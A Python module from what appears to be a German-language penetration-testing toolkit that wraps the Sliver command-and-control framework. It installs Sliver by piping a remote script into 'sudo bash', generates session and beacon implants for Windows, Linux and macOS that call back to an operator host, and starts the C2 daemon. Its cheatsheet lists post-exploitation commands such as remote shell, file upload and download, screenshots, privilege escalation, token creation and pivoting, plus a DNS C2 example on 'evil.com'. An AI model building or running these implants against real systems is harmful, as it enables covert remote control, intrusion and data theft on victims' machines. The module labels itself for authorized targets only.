"""
Sliver C2 — Professionelles Go-basiertes Command & Control Framework.

Sliver ist das modernste Open-Source C2-Framework (BishopFox).
Features:
  - mTLS / HTTP / HTTPS / DNS / WireGuard Listener
  - Implants: Session (interaktiv) oder Beacon (periodisch)
  - Built-in Pivoting, Port-Forwarding, SOCKS5
  - Armory: Plugins (BOF, Extensions)
  - Multiplayer: mehrere Operatoren gleichzeitig

Vergleich mit Telegram C2:
  Telegram C2  → einfach, keine Installation auf Ziel nötig, Operator via Handy
  Sliver C2    → professionell, schnell, viele Features, für ernste Engagements
"""
from __future__ import annotations
import asyncio
import os
import shutil
from typing import AsyncGenerator

from core.danger import DangerLevel
from core.runner import CommandRunner
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Sliver C2",
    description=(
        "Professionelles Go-C2 Framework (BishopFox). "
        "mTLS/HTTP/DNS Listener, Session- und Beacon-Implants, Pivoting."
    ),
    usage="Erst installieren, dann Listener starten + Implant generieren.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen.",
    example="Sliver installieren → HTTP Listener → Windows EXE Implant generieren",
)

DANGER = DangerLevel.BLACK

_SLIVER_INSTALL_SCRIPT = "https://sliver.sh/install"
_SLIVER_SERVER = "sliver-server"
_SLIVER_CLIENT = "sliver"


def is_installed() -> bool:
    return shutil.which(_SLIVER_SERVER) is not None


def _sliver_version() -> str:
    import subprocess
    try:
        r = subprocess.run([_SLIVER_SERVER, "version"], capture_output=True, text=True, timeout=10)
        for line in r.stdout.splitlines():
            if "version" in line.lower():
                return line.strip()
        return r.stdout.strip()[:80] or "?"
    except Exception:
        return "?"


class SliverInstall:
    async def run(self) -> AsyncGenerator[str, None]:
        yield "[*] Installiere Sliver C2..."
        yield "[*] Quelle: sliver.sh/install (offizielles Installationsskript)"
        yield ""

        if is_installed():
            v = _sliver_version()
            yield f"[+] Sliver ist bereits installiert: {v}"
            yield "[*] Nichts zu tun."
            return

        yield "[*] Lade Installationsskript herunter..."
        runner = CommandRunner()
        async for line in runner.stream(
            ["bash", "-c", f"curl -sSf {_SLIVER_INSTALL_SCRIPT} | sudo bash"],
            timeout=300,
        ):
            yield line

        if is_installed():
            yield f"\n[+] Sliver erfolgreich installiert!"
            yield f"[*] Version: {_sliver_version()}"
            yield ""
            yield "[*] Nächste Schritte:"
            yield "    1. sliver-server daemon  (Server im Hintergrund)"
            yield "    2. sliver               (Client verbinden)"
            yield "    3. http                  (HTTP Listener starten)"
            yield "    4. generate --http LHOST --os windows  (Implant bauen)"
        else:
            yield "[!] Installation fehlgeschlagen — manuell ausführen:"
            yield f"    curl -sSf {_SLIVER_INSTALL_SCRIPT} | sudo bash"


class SliverImplantBuilder:
    def __init__(
        self,
        lhost: str,
        lport: int = 80,
        protocol: str = "http",
        target_os: str = "windows",
        arch: str = "amd64",
        fmt: str = "exe",
        output_dir: str = "/tmp",
        beacon: bool = False,
        beacon_interval: int = 60,
    ):
        self.lhost    = lhost
        self.lport    = lport
        self.protocol = protocol
        self.os       = target_os
        self.arch     = arch
        self.fmt      = fmt
        self.out      = output_dir
        self.beacon   = beacon
        self.interval = beacon_interval

    def _build_cmd(self) -> list[str]:
        name = f"penkit_{self.protocol}_{self.os}"
        out  = os.path.join(self.out, f"implant_{name}.{self.fmt}")

        if self.beacon:
            base = [
                _SLIVER_SERVER, "generate", "beacon",
                f"--{self.protocol}", f"{self.lhost}:{self.lport}",
                "--seconds", str(self.interval),
                "--os", self.os,
                "--arch", self.arch,
                "--format", self.fmt,
                "--save", out,
                "--name", name,
            ]
        else:
            base = [
                _SLIVER_SERVER, "generate",
                f"--{self.protocol}", f"{self.lhost}:{self.lport}",
                "--os", self.os,
                "--arch", self.arch,
                "--format", self.fmt,
                "--save", out,
                "--name", name,
            ]
        return base, out

    async def build(self) -> AsyncGenerator[str, None]:
        if not is_installed():
            yield "[!] Sliver nicht installiert — erst Option 1 ausführen."
            return

        cmd, out_path = self._build_cmd()
        mode = "Beacon" if self.beacon else "Session"

        yield f"[*] Generiere Sliver {mode} Implant..."
        yield f"[*] Protokoll : {self.protocol.upper()}"
        yield f"[*] LHOST     : {self.lhost}:{self.lport}"
        yield f"[*] OS/Arch   : {self.os}/{self.arch}"
        yield f"[*] Format    : {self.fmt}"
        if self.beacon:
            yield f"[*] Interval  : {self.interval}s"
        yield f"[*] Ausgabe   : {out_path}"
        yield ""

        runner = CommandRunner()
        async for line in runner.stream(cmd, timeout=120):
            yield line

        if os.path.exists(out_path):
            size = os.path.getsize(out_path)
            yield f"\n[+] Implant generiert: {out_path}"
            yield f"[+] Größe: {size:,} Bytes"
            yield ""
            yield "[*] Listener auf Kali starten:"
            yield f"    sliver  →  {self.protocol}  →  (startet Listener)"
            yield ""
            yield "[*] Auf Ziel ausführen:"
            yield f"    {os.path.basename(out_path)}"
            yield ""
            yield "[*] In Sliver-Session interagieren:"
            yield "    sessions    → aktive Sessions anzeigen"
            yield "    use <ID>    → Session auswählen"
            yield "    shell       → interaktive Shell"
            yield "    upload/download  → Datei Transfer"
            yield "    socks5 start     → SOCKS5 Proxy"
            yield "    portfwd add      → Port Forwarding"
        else:
            yield "[!] Implant wurde nicht erstellt — Fehler prüfen."
            yield "[*] Tipp: sliver-server muss einmalig mit 'sliver-server unpack' initialisiert sein."


class SliverDaemon:
    async def start(self) -> AsyncGenerator[str, None]:
        if not is_installed():
            yield "[!] Sliver nicht installiert."
            return

        yield "[*] Starte Sliver Server Daemon..."
        yield "[*] Läuft im Hintergrund auf Port 31337"
        yield ""

        runner = CommandRunner()
        async for line in runner.stream(
            ["bash", "-c", "nohup sliver-server daemon > /tmp/sliver_daemon.log 2>&1 & echo PID:$!"],
            timeout=10,
        ):
            yield line

        await asyncio.sleep(1)
        yield "[+] Daemon gestartet. Log: /tmp/sliver_daemon.log"
        yield ""
        yield "[*] Client verbinden:"
        yield "    sliver"
        yield ""
        yield "[*] Listener starten (in sliver Client):"
        yield "    http                      HTTP Listener Port 80"
        yield "    https                     HTTPS Listener Port 443"
        yield "    mtls                      mTLS Listener Port 8888"
        yield "    dns --domains evil.com    DNS C2 (Domain nötig)"
        yield ""
        yield "[*] Implant generieren (in sliver Client):"
        yield "    generate --http <LHOST> --os windows --arch amd64 --format exe --save /tmp/"
        yield "    generate beacon --http <LHOST> --seconds 60 --os windows --save /tmp/"


def get_cheatsheet() -> list[str]:
    """Gibt Sliver Quickref zurück."""
    return [
        "═══════════════ SLIVER CHEATSHEET ════════════════",
        "",
        "SERVER STARTEN:",
        "  sliver-server daemon",
        "  sliver               ← Client verbinden",
        "",
        "LISTENER:",
        "  http                 ← HTTP Port 80",
        "  https                ← HTTPS Port 443",
        "  mtls                 ← Mutual TLS Port 8888",
        "  dns --domains x.com  ← DNS C2",
        "",
        "IMPLANT GENERIEREN:",
        "  generate --http LHOST --os windows --arch amd64 --format exe --save /tmp/",
        "  generate beacon --http LHOST --seconds 30 --os windows --save /tmp/",
        "  generate --http LHOST --os linux --arch amd64 --format elf",
        "  generate --http LHOST --os macos --arch arm64 --format macho",
        "",
        "SESSIONS:",
        "  sessions             ← alle anzeigen",
        "  use <SESSION_ID>     ← auswählen",
        "  background           ← zurück",
        "",
        "IN SESSION:",
        "  shell                ← interaktive Shell",
        "  execute -o whoami    ← Befehl ausführen",
        "  upload src dst       ← Datei hochladen",
        "  download src dst     ← Datei runterladen",
        "  screenshot           ← Screenshot",
        "  ps                   ← Prozesse",
        "  netstat              ← Netzwerk",
        "  socks5 start         ← SOCKS5 Proxy",
        "  portfwd add -r TARGET:PORT ← Port Forward",
        "  pivot tcp --bind TARGET:9898 ← Pivot",
        "  getsystem            ← PrivEsc versuchen",
        "  getprivs             ← Privileges",
        "  make-token USER PASS ← Token erstellen",
        "",
        "ARMORY (Extensions):",
        "  armory install all   ← alle Plugins",
        "  bof execute-assembly ← BOF laden",
        "═══════════════════════════════════════════════════",
    ]
